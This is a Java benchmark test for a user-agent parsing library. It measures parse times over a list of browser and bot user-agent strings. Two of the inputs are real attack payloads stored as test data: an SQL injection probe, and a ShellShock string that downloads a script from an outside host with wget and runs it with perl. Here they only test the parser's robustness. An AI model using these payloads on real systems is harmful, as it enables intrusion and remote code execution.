/*
 * Yet Another UserAgent Analyzer
 * Copyright (C) 2013-2019 Niels Basjes
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package nl.basjes.parse.useragent.benchmarks;

import nl.basjes.parse.useragent.UserAgent;
import nl.basjes.parse.useragent.UserAgentAnalyzer;
import nl.basjes.statistics.Counter;
import org.apache.commons.lang3.tuple.Triple;
import org.junit.Test;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.ArrayList;
import java.util.List;

public class RunBenchmarks {

    private static final Logger LOG = LoggerFactory.getLogger(RunBenchmarks.class);
    private UserAgentAnalyzer uaa;

    @Test
    public void runBenchmarks() {

        uaa = UserAgentAnalyzer
            .newBuilder()
            .withoutCache()
            .preheat(10000)
            .build();

        List<Triple<Counter, String, String>> testCases = createTestCasesList();

        System.gc(); // Avoid gc during tests

        for (int run = 1; run < 10000; run++) {
            if (run % 100 == 0) {
                System.gc(); // Avoid gc during tests
                LOG.info("Did {} runs", run);
            }
            testCases.forEach(this::doTest);
        }

        testCases.forEach(this::printResults);

    }

    private void doTest(Triple<Counter, String, String> test) {

        long start = System.nanoTime();
        UserAgent agent = uaa.parse(test.getRight());
        long stop = System.nanoTime();
        if(agent.getValue("DeviceClass") == null) {
            LOG.error("This should not happen, yet we keep this test to avoid the parse being optimized out.");
        }

        test.getLeft().increment((double)(stop - start));
    }

    private void printResults(Triple<Counter, String, String> test) {
        String logLine = String.format("| Test | %-30s | Average(ms): | %6.3f | 3σ(ms): | %6.3f | min-max(ms): | %6.3f | %6.3f |",
            test.getMiddle(),
            test.getLeft().getMean()/1000000,
            3* test.getLeft().getStdDev()/1000000,
            test.getLeft().getMin()/1000000,
            test.getLeft().getMax()/1000000
            );
        LOG.warn("{}", logLine);
    }

    private List<Triple<Counter, String, String>> createTestCasesList() {
        List<Triple<Counter, String, String>> testCases = new ArrayList<>();

        // CHECKSTYLE.OFF: LineLength
        testCases.add(Triple.of(new Counter(), "Android 7 Chrome 72",       "Mozilla/5.0 (Linux; Android 7.1.1; Nexus 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36"));
        testCases.add(Triple.of(new Counter(), "Android 6 Chrome 46",       "Mozilla/5.0 (Linux; Android 6.0; Nexus 6 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36"));
        testCases.add(Triple.of(new Counter(), "Android Phone",             "Mozilla/5.0 (Linux; Android 5.0.1; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36"));
        testCases.add(Triple.of(new Counter(), "Google AdsBot",             "AdsBot-Google (+http://www.google.com/adsbot.html)"));
        testCases.add(Triple.of(new Counter(), "Google AdsBot Mobile",      "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"));
        testCases.add(Triple.of(new Counter(), "GoogleBot Mobile Android",  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"));
        testCases.add(Triple.of(new Counter(), "GoogleBot",                 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"));
        testCases.add(Triple.of(new Counter(), "Hacker SQL",                "-8434))) OR 9695 IN ((CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (9695=9695) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(118)+CHAR(113))) AND (((4283=4283"));
        testCases.add(Triple.of(new Counter(), "Hacker ShellShock",         "() { :;}; /bin/bash -c \\\"\"wget -O /tmp/bbb ons.myftp.org/bot.txt; perl /tmp/bbb\\\"\""));
        testCases.add(Triple.of(new Counter(), "iPad",                      "Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1"));
        testCases.add(Triple.of(new Counter(), "iPhone",                    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1"));
        testCases.add(Triple.of(new Counter(), "iPhone FacebookApp",        "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G34 [FBAN/FBIOS;FBAV/61.0.0.53.158;FBBV/35251526;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.3;FBSS/2;FBCR/vfnl;FBID/phone;FBLC/nl_NL;FBOP/5]"));
        testCases.add(Triple.of(new Counter(), "Linux Chrome 72",           "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36"));
        testCases.add(Triple.of(new Counter(), "Win 10 Chrome 51",          "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"));
        testCases.add(Triple.of(new Counter(), "Win 10 Edge13",             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"));
        testCases.add(Triple.of(new Counter(), "Win 7 IE11",                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"));
        testCases.add(Triple.of(new Counter(), "Win 10 IE 11",              "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"));

        return testCases;
    }

}
